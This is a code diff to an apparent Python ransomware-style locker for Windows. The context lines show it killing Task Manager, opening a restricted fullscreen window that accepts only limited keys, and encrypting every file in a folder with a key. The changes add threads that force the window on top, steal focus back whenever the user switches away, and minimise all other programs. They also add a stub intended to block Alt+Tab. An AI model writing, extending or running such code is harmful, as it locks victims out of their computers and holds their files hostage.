@@ -7,7 +7,8 @@ import atexit
 import ctypes
 import ctypes.wintypes
 from time import sleep
-
+import threading
+import time
 
 
 
@@ -64,6 +65,141 @@ def kill_task_manager_if_running():
         print(f"Error: {e}")
         return False
 
+def keep_window_always_on_top(hwnd):
+    """Continuously force window to stay on top using a background thread"""
+    def enforce_on_top():
+        HWND_TOPMOST = -1
+        SWP_NOMOVE = 0x0002
+        SWP_NOSIZE = 0x0001
+        user32 = ctypes.windll.user32
+        
+        while True:
+            try:
+                user32.SetWindowPos(
+                    hwnd,
+                    HWND_TOPMOST,
+                    0, 0, 0, 0,
+                    SWP_NOMOVE | SWP_NOSIZE
+                )
+            except:
+                pass
+            time.sleep(0.1)  # Check every 100ms
+    
+    # Start the background thread
+    thread = threading.Thread(target=enforce_on_top, daemon=True)
+    thread.start()
+    return thread
+
+def force_window_focus(hwnd):
+    """Force the window to gain focus and become active"""
+    try:
+        user32 = ctypes.windll.user32
+        
+        # Restore window if minimized
+        user32.ShowWindow(hwnd, 9)  # SW_RESTORE = 9
+        
+        # Bring window to foreground
+        user32.SetForegroundWindow(hwnd)
+        
+        # Set window to always on top again
+        HWND_TOPMOST = -1
+        SWP_NOMOVE = 0x0002
+        SWP_NOSIZE = 0x0001
+        user32.SetWindowPos(
+            hwnd,
+            HWND_TOPMOST,
+            0, 0, 0, 0,
+            SWP_NOMOVE | SWP_NOSIZE
+        )
+        
+        return True
+    except Exception as e:
+        print(f"Focus error: {e}")
+        return False
+
+def is_window_focused(hwnd):
+    """Check if our window is currently focused"""
+    try:
+        user32 = ctypes.windll.user32
+        foreground_hwnd = user32.GetForegroundWindow()
+        return hwnd == foreground_hwnd
+    except:
+        return False
+
+def monitor_and_steal_focus(hwnd):
+    """Background thread that continuously checks if window has focus and steals it back if not"""
+    def focus_stealer():
+        user32 = ctypes.windll.user32
+        
+        while True:
+            try:
+                # Check if our window is in the foreground
+                foreground_hwnd = user32.GetForegroundWindow()
+                
+                if hwnd != foreground_hwnd:
+                    print("Window lost focus! Stealing it back...")
+                    
+                    # Restore window if minimized
+                    user32.ShowWindow(hwnd, 9)  # SW_RESTORE = 9
+                    
+                    # Bring window to foreground
+                    user32.SetForegroundWindow(hwnd)
+                    
+                    # Set window to always on top
+                    HWND_TOPMOST = -1
+                    SWP_NOMOVE = 0x0002
+                    SWP_NOSIZE = 0x0001
+                    user32.SetWindowPos(
+                        hwnd,
+                        HWND_TOPMOST,
+                        0, 0, 0, 0,
+                        SWP_NOMOVE | SWP_NOSIZE
+                    )
+                    
+                    # Also try to minimize other windows to be safe
+                    # This helps ensure our window is the only visible one
+                    minimize_all_programs_builtin()
+                    
+                    # Small delay to let the window regain focus
+                    time.sleep(0.05)
+                    
+                    # Force focus one more time
+                    user32.SetForegroundWindow(hwnd)
+                    
+            except Exception as e:
+                print(f"Focus monitor error: {e}")
+            
+            time.sleep(0.1)  # Check every 100ms
+    
+    # Start the focus stealing thread
+    thread = threading.Thread(target=focus_stealer, daemon=True)
+    thread.start()
+    return thread
+
+def prevent_alt_tab():
+    """Try to prevent Alt+Tab from working"""
+    try:
+        # This is a more aggressive approach - hook into the system
+        # Note: This might not work on all Windows versions
+        import ctypes
+        from ctypes import wintypes
+        
+        # Constants for low-level keyboard hook
+        WH_KEYBOARD_LL = 13
+        WM_KEYDOWN = 0x0100
+        WM_SYSKEYDOWN = 0x0104
+        VK_TAB = 0x09
+        VK_LMENU = 0xA4  # Left Alt
+        VK_RMENU = 0xA5  # Right Alt
+        
+        # Keyboard hook function - not implemented for simplicity
+        # Full implementation would require a low-level hook
+        print("Note: Full Alt+Tab prevention requires a system hook")
+        print("Using focus stealing method instead...")
+        return False
+    except:
+        return False
+
 def create_restricted_window():
 
     minimize_all_programs_builtin()
@@ -107,6 +243,14 @@ def create_restricted_window():
             0, 0, 0, 0,
             SWP_NOMOVE | SWP_NOSIZE | SWP_SHOWWINDOW
         )
+        
+        # Start background thread to continuously enforce always-on-top
+        enforce_thread = keep_window_always_on_top(hwnd)
+        print("Always-on-top enforcement thread started")
+        
+        # Start focus stealing thread
+        focus_thread = monitor_and_steal_focus(hwnd)
+        print("Focus stealing thread started")
     
     allowed_keys = set(range(pygame.K_a, pygame.K_z + 1))
     allowed_keys.update([pygame.K_RETURN, pygame.K_KP_ENTER])
@@ -131,6 +275,31 @@ def create_restricted_window():
     running = True
     while running:
         kill_task_manager_if_running()
+        
+        # Continuously force window to stay on top and focused in the main loop too
+        if sys.platform == 'win32':
+            try:
+                # Force window to stay on top
+                user32.SetWindowPos(
+                    hwnd,
+                    HWND_TOPMOST,
+                    0, 0, 0, 0,
+                    SWP_NOMOVE | SWP_NOSIZE
+                )
+                
+                # Check if we have focus, if not steal it
+                foreground_hwnd = user32.GetForegroundWindow()
+                if hwnd != foreground_hwnd:
+                    # Restore window
+                    user32.ShowWindow(hwnd, 9)  # SW_RESTORE
+                    # Set foreground
+                    user32.SetForegroundWindow(hwnd)
+                    # Minimize all windows again
+                    minimize_all_programs_builtin()
+                    
+            except:
+                pass
+        
         for event in pygame.event.get():
             if event.type == pygame.QUIT:
                 continue
@@ -200,11 +369,6 @@ def create_restricted_window():
         warning_rect = warning_text.get_rect(center=(screen.get_width() // 2, screen.get_height() // 4 * 3))
         screen.blit(warning_text, warning_rect)
 
-        # Continuously force window to stay on top
-        if sys.platform == 'win32':
-            user32.SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, 0, 0, 
-                              SWP_NOMOVE | SWP_NOSIZE)
-        
         pygame.display.flip()
     
     pygame.quit()
@@ -288,7 +452,6 @@ def get_all_files(folder_path: str) -> list:
             files.append(full_path)
     
     return files
-
 
 
 
@@ -401,7 +564,6 @@ def permutation_out(text, key):
 
 
 
-
 def encrypt(file_path, key):
     print(f"Encrypting: {file_path}")
     global path_check_state
@@ -445,4 +607,3 @@ elif state == "dec":
         key = f.read()
     for path in paths:
         decrypt(path, key)
-
